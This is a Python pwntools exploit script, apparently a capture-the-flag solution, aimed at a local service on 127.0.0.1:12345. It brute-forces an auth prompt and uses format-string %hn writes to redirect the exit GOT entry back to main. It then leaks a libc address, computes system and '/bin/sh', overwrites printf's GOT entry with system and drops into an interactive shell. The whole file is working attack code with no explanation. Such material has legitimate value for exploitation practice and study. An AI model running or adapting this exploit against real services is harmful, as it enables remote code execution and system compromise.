#!/usr/bin/env python
# coding: utf-8

from pwn import *
context(arch = 'amd64', os = 'linux' ) 

def start():
    p=remote('127.0.0.1',12345)
    p.recvuntil('auth code: \x00')
    p.sendline('cheating U'+'0')
    x = p.recv(1024)
    print(x)
    return p, x

def validate():
    p, x = start()

    while(True):
        if ('slogan: ' in x):
            # match success
            break;
        # not match, try again
        p.close()
        print("not match, retry")
        p, x = start()

    print("validation success")
    raw_input()
    return p


# set exit to main
def set_exit_to_slogan():
    v = 0xbe9
    s = ""

    s += "%" + str(v) + "c"
    s += "%8$hn"
    for i in range(16-len(s)):
        s += "a"
    s += p64(0x602078)
    return s

def repeat_2_main():
    p = validate()
    s = set_exit_to_slogan()
    print("sending buf: " + s)
    p.send(s + '\n')
    p.recv(1024)
    print(p.recvuntil('slogan: \x00'))
    print("recving slogan, repeat success")
    raw_input()
    return p


# get addr of libc func
def leakaddr(v):
    s = ""

    s += "%8$s"
    for i in range(8-len(s)):
        s += "a"
    s += p64(v)
    return s

#read libc addr 
def readaddr(s):
    end = s.find("aaa")
    straddr = s[:end]
    addr = 0
    print("straddr : " + straddr + "\n")
    for i in range(len(straddr)):
        print(str(i) + ": " + straddr[i]  + " " + hex(ord(straddr[i])))
        addr += (ord(straddr[i])<<(8*i))
    return addr

# get offset of system and binsh
def getdistance():
    libc = ELF("./libc.so.6")
    system_addr = libc.symbols['system']
    read_addr = libc.symbols['read']
    binsh_addr = next(libc.search("/bin/sh"))
    return system_addr - read_addr, binsh_addr - system_addr

# get read addr, calc system and binsh addr
def get_system_binsh_addr(p):
    z = leakaddr(0x602050)    #read
    print(z)
    p.send(z)
    addr_read = p.recvuntil("slogan: \x00")
    print("recv: " + addr_read)
    read = readaddr(addr_read)
    print("end : " + str(read) + " " + hex(read))
    dist, offset = getdistance()
    system = read + dist
    print("system :" + hex(system))
    binsh  = system + offset
    print("binsh  :" + hex(binsh))
    return system, binsh


#set printf to system
def set_printf_to_system(system):
    printf_got = 0x602030

    x  = system & 0xFFFFFFFF
    a  = x & 0xFFFF
    a1 = printf_got
    b  = (x >> 16) & 0xFFFF
    b1 = printf_got + 2

    if (a > b):
        tmp = a
        a   = b
        b   = tmp
        tmp = a1
        a1  = b1
        b1  = tmp

    s  = "%" + str(a) + "c"
    s += "%12$hn"
    s += "%" + str(b-a) + "c"
    s += "%13$hn"
    for i in range(32-len(s)):
        s += 'a'
    s += p64(a1)
    s += p64(b1)
    return s


def call_system(p, system):
    z = set_printf_to_system(system)
    print(z)
    p.send(z) 
    p.recvuntil("slogan: \x00");
    p.send("/bin/sh\x00")

def main():
    p = repeat_2_main()
    system, binsh = get_system_binsh_addr(p)
    call_system(p, system)
    p.interactive()

main()
